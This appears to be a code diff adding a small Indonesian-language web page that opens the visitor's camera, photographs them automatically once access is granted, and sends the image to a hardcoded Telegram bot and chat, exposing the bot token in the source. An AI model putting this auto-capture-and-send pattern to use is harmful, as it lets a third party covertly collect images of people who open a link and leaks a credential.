@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Contoh Mengambil Foto Kamera dan Kirim ke Telegram</title>
+  </head>
+  <body>
+    <h1>Ambil Foto Kamera dan Kirim ke Telegram</h1>
+    <div>
+      <video id="video" width="400" height="300" autoplay></video>
+    </div>
+    <canvas id="canvas" width="400" height="300"></canvas>
+    <div id="status"></div>
+    <div id="response"></div>
+
+    <script>
+      var video = document.getElementById("video");
+      var canvas = document.getElementById("canvas");
+      var statusElement = document.getElementById("status");
+      var responseElement = document.getElementById("response");
+
+      // Mengakses kamera
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (stream) {
+            video.srcObject = stream;
+            capturePhoto();
+          })
+          .catch(function (error) {
+            statusElement.textContent = "Error accessing camera: " + error;
+          });
+      } else {
+        statusElement.textContent = "MediaDevices getUserMedia is not supported.";
+      }
+
+      // Mengambil foto dan mengirimnya ke Telegram
+      function capturePhoto() {
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        var dataURL = canvas.toDataURL("image/jpeg");
+
+        var photoBlob = dataURItoBlob(dataURL);
+        var formData = new FormData();
+        formData.append("photo", photoBlob, "photo.jpg");
+
+        var botToken = "6237983789:AAFltZlpIi91mYKpmBCwQip32tv0FgpTGyQ";
+        var chatId = "6025145303";
+
+        fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto?chat_id=" + chatId, {
+          method: "POST",
+          body: formData,
+        })
+          .then(function (response) {
+            statusElement.textContent = "Foto berhasil dikirim ke Telegram.";
+            return response.json();
+          })
+          .then(function (data) {
+            responseElement.textContent = "Respon dari API Telegram: " + JSON.stringify(data);
+          })
+          .catch(function (error) {
+            statusElement.textContent = "Error saat mengirim foto ke Telegram: " + error;
+          });
+      }
+
+      // Fungsi untuk mengubah data URI menjadi Blob
+      function dataURItoBlob(dataURI) {
+        var byteString = atob(dataURI.split(",")[1]);
+        var mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+
+        var arrayBuffer = new ArrayBuffer(byteString.length);
+        var uint8Array = new Uint8Array(arrayBuffer);
+
+        for (var i = 0; i < byteString.length; i++) {
+          uint8Array[i] = byteString.charCodeAt(i);
+        }
+
+        return new Blob([arrayBuffer], { type: mimeString });
+      }
+    </script>
+  </body>
+</html>
